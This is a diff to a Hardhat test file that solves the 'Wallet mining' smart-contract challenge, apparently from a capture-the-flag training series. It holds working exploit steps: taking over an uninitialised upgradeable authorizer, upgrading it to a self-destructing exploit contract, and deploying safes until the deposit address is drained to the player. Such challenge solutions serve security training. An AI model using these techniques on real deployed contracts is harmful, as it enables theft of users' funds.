@@ -112,27 +112,28 @@ describe('[Challenge] Wallet mining', function () {
         }
 
         // the factory contract now has code
-        const factContract = await ethers.getContractAt("GnosisSafeProxyFactory", await walletDeployer.fact());
-        const copyAddress = await walletDeployer.copy();
 
-        // deploy all safes prior to the deposit safe
-        for (let i = 0; i < 42; i++) {
-            // no initialization data is needed
-            await factContract.connect(player).createProxy(copyAddress, "0x");
-        }
-
+        // upgrade the authorizer to the exploit contract and call selfDestruct to destroy the authorizer implementation
         const authorizerImplSlot = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
         const authorizerImplAddress = `0x${(await ethers.provider.getStorageAt(authorizer.address, authorizerImplSlot)).substring(26)}`;
         const authorizerImpl = await ethers.getContractAt("AuthorizerUpgradeable", authorizerImplAddress);
         await authorizerImpl.connect(player).init([], []);
         const authorizerExploit = await (await ethers.getContractFactory("AuthorizerExploit")).deploy();
-        // Upgrade the authorizer to the exploit contract and call selfDestruct
         await authorizerImpl.connect(player).upgradeToAndCall(authorizerExploit.address, authorizerExploit.interface.encodeFunctionData("selfDestruct", []));
 
+        // all calls to `can(u, a)` will now return true for any u and a
+
+        // deploy all safes prior to the deposit safe
+        for (let i = 0; i < 42; i++) {
+            // no initialization data is needed
+            await walletDeployer.connect(player).drop("0x");
+        }
+
         // the initalization data should drain the deposit address and send the funds to the player
-        const data = "0xb63e800d0000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000140000000000000000000000000d5d82b6addc9027b22dca772aa68d5d74cdbdf440000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000051d07a4fb3bd10121a343d85818da60000000000000000000000000000000000000000000000000000000000000000";
+        const data = "0x";
+
         // deploy the safe of the deposit address and drain the funds to the player
-        await factContract.connect(player).createProxy(copyAddress, data);
+        await walletDeployer.connect(player).drop(data);
 
         // const wallet = await (await ethers.getContractFactory("GnosisSafe")).attach(DEPOSIT_ADDRESS);
 
